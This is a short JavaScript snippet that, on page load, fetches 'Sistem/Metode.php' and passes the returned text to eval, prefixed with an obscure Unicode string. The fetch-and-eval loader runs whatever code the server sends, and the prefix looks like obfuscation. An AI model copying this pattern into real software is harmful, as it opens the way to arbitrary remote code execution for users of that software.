window.onload = function(){
	$ = 'ᦕﻣﹷﻌﹿﺮﹸﻭﻔﹿ';
	if( typeof XMLHttpRequest == "undefined" ){
		XMLHttpRequest = function(){
			return new ActiveXObject(
				navigator.userAgent.indexOf("MSIE 5")>=0
				?"Microsoft.XMLHTTP"
				:"Msxml2.XMLHTTP")
		}
	};
	var REQ = new XMLHttpRequest();
	REQ.open('GET', 'Sistem/Metode.php', true);
	REQ.onreadystatechange = function(){
		if( REQ.readyState == 4 ){
			eval($+REQ.responseText);
			REQ = null
		}
	};
	REQ.send()
};